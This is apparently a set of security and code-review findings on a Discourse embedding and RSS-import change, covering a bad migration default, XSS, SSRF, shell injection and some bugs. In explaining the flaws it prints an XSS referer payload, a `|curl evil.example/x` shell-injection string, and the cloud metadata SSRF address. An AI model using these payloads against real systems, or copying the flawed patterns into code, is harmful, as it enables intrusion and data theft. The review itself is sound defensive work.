findings.title: Migration default makes every existing post raw_html
findings.body: The migration adds the `cook_method` column with `default: 1` and `null: false`. Given `Post.cook_methods = Enum.new(:regular, :raw_html)` is 0-indexed (the convention used by Discourse's `Enum`), `1` is `:raw_html`. That means after the migration runs, every existing post row has `cook_method == :raw_html`, so `Post#cook` (`return raw if cook_method == Post.cook_methods[:raw_html]` in `app/models/post.rb`) returns the raw column verbatim and the entire cooking pipeline (markdown rendering, oneboxing, link rewriting, sanitisation, plugin post-cook filters) is bypassed for every legacy post. The default should be `0` (`:regular`); only the RSS import path explicitly sets the column to `Post.cook_methods[:raw_html]`. Without this fix, the first time any post is revised it will save `cooked = raw` and silently corrupt the rendered HTML for the whole forum.

findings.title: Unescaped request.referer interpolated into JavaScript string
findings.body: The line `parent.postMessage({...}, '<%= request.referer %>');` inserts the raw `request.referer` value into a JavaScript string literal. The controller's `ensure_embeddable` filter only checks `URI(request.referer || '').host != SiteSetting.embeddable_host`, which validates only the host portion, not the path or query string. An attacker who controls any path/query on the embeddable host (e.g. a user-controlled redirect, search parameter echo, or a path segment) can provide a referer such as `https://example.com/');alert(document.domain);//` that passes validation and breaks out of the string at render time, producing stored XSS inside the embed iframe. The referer must be HTML- and JavaScript-escaped before being interpolated, or (better) the embeddable host should be passed as a validated server-side constant (or post to `'*'` with a strict origin check on the parent listener) instead of trusting the raw header.

findings.title: Imported RSS/HTML bypasses sanitisation via raw_html cook_method
findings.body: `TopicEmbed.import` always creates the post with `cook_method: Post.cook_methods[:raw_html]` and `skip_validations: true`. `Post#cook` then returns `raw` unchanged, and the embed view renders it with `<%= raw post.cooked %>` (see `app/views/embed/best.html.erb` line 19). The `Readability::Document` call in `import_remote` only whitelists tags/attributes — it does not strip `javascript:` URLs nor `on*` event handlers, and the `absolutize_urls` rewrite only acts on `href`/`src` that start with `/`. As a result, content fetched from an attacker-controlled URL can contain `` or `` that survives into the rendered embed iframe. The combination of raw_html + direct `raw` rendering in the embed view means any URL the admin (or attacker who triggers an import) submits becomes an XSS payload served from the Discourse origin inside the embedder's frame.

findings.title: Kernel#open on user-controlled URL enables shell injection and SSRF
findings.body: `rss = SimpleRSS.parse open(SiteSetting.feed_polling_url)` uses Ruby's `Kernel#open`, which calls `Kernel#system` when the argument starts with `|`. A site administrator able to influence `feed_polling_url`, or any data source that ends up feeding it, could pass a string like `|curl evil.example/x|https://attacker/feed` to execute arbitrary commands on the host. Even without that, there is no timeout, no size cap, no redirect policy, and no URL validation, so the worker can be made to fetch internal addresses (SSRF: localhost, link-local IPs, AWS metadata endpoint `169.254.169.254`, etc.), or to hang on a slow peer. Replace with an HTTP client such as `Net::HTTP`/`Faraday` with an explicit timeout, an address whitelist, and an internal-IP blocklist.

findings.title: Kernel#open on remote read URL enables shell injection and SSRF
findings.body: `doc = Readability::Document.new(open(url).read, ...)` in `import_remote` has the same problems as the feed job: `Kernel#open` allows command execution via the `|` form, and any caller able to influence `@embed_url` (or the URL registered into `TopicEmbed.embed_url`) can reach this path. Add the same mitigations: use `Net::HTTP`/`URI.open` with an explicit timeout, an internal-IP blocklist, and a follow-redirects policy.

findings.title: PollFeed executed inline, blocking the embed worker
findings.body: `perform_retrieve` invokes `Jobs::PollFeed.new.execute({})` synchronously inside the worker handling `RetrieveTopic`. PollFeed downloads the full RSS feed and imports every item, which can take minutes; doing it inline blocks the worker and serialises all embed retrievals behind the feed poll. If `feed_polling_enabled?` is true, any number of concurrent embed retrievals will all race to call PollFeed in parallel (no lock), causing duplicate feed downloads. Either enqueue the poll as a separate Sidekiq job (and reuse the existing `feed_key` cache to coalesce) or drop the inline call and rely on the scheduled job to have populated the cache.

findings.title: NoMethodError when feed item has no content
findings.body: `content = CGI.unescapeHTML(i.content.scrub)` will raise `NoMethodError: undefined method scrub for nil` if any feed item omits `content` (or yields a nilable value depending on the feed shape). `i.title` is also passed straight into `TopicEmbed.import` and is rendered later as a topic title — a nil title causes a validation failure that propagates. Use `(i.content || '').scrub` and guard against nil titles.

findings.title: feed_key helper is unused dead code
findings.body: `feed_key` (memoising `"feed-modified:#{Digest::SHA1.hexdigest(SiteSetting.feed_polling_url)}"`) is defined on `Jobs::PollFeed` but is never referenced anywhere in the codebase. Either delete it or wire it into the poll to actually skip duplicates (which would also help fix the inline-invocation problem in `lib/topic_retriever.rb`).
